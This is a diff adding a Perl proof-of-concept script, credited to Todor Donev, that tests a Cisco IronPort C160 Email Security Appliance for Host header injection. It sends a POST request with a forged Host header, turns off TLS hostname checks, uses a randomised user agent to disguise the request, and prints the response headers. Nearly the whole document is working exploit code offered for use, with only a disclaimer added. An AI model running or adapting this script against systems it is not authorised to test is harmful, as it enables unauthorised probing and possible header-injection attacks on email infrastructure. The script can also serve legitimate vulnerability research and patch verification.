@@ -1,0 +1,51 @@
+#!/usr/bin/perl -w
+#
+#
+#  Cisco (Titsco) Email Security Appliance (IronPort) C160 Header 'Host' Injection
+#
+#
+#  Copyright 2019 (c) Todor Donev <todor.donev at gmail.com>
+#
+#
+#  Disclaimer:
+#  This or previous programs are for Educational purpose ONLY. Do not use it without permission. 
+#  The usual disclaimer applies, especially the fact that Todor Donev is not liable for any damages 
+#  caused by direct or indirect use of the  information or functionality provided by these programs. 
+#  The author or any Internet provider  bears NO responsibility for content or misuse of these programs 
+#  or any derivatives thereof. By using these programs you accept the fact  that any damage (dataloss, 
+#  system crash, system compromise, etc.) caused by the use  of these programs are not Todor Donev's 
+#  responsibility.
+#   
+#  Use them at your own risk!
+#
+# 
+use strict;
+use HTTP::Request;
+use LWP::UserAgent;
+use WWW::UserAgent::Random;
+use HTTP::CookieJar::LWP;
+
+
+my $host = shift || 'https://192.168.1.1:443/';
+
+print ("[+] Cisco (Titsco) Email Security Appliance (IronPort) C160 Header 'Host' Injection\n");
+print ("===================================================================================\n");
+print ("[!] Author: Todor Donev <todor.donev\@gmail.com>\n");
+print ("[?] e.g. perl $0 https://target:port/\n") and exit if ($host !~ m/^http/);
+
+my $user_agent = rand_ua("browsers");
+my $jar = HTTP::CookieJar::LWP->new();
+my $browser  = LWP::UserAgent->new(
+                                        protocols_allowed => ['http', 'https'],
+                                        ssl_opts => { verify_hostname => 0 }
+                                );
+   $browser->timeout(10);
+   $browser->cookie_jar($jar);
+   $browser->agent($user_agent);
+
+my $request = HTTP::Request->new (POST => $host,
+                                  [ Content_Type => "application/x-www-form-urlencoded" ,
+                                    Referer => $host], " ");
+$request->header("Host" => "Header-Injection");
+my $content = $browser->request($request);
+print $content->headers_as_string();
